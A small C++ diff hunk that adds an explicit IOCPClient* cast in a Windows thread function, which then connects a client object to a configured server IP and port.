@@ -103,7 +103,7 @@ DWORD WINAPI ThreadProc(LPVOID lParam)
 template <class Manager, int n> DWORD WINAPI LoopManager(LPVOID lParam)
 {
 	ThreadInfo *pInfo = (ThreadInfo *)lParam;
-	IOCPClient	*ClientObject = pInfo->p;
+	IOCPClient	*ClientObject = (IOCPClient *)pInfo->p;
 	CONNECT_ADDRESS& g_SETTINGS(*(pInfo->conn));
 	if (ClientObject->ConnectServer(g_SETTINGS.ServerIP(), g_SETTINGS.ServerPort()))
 	{
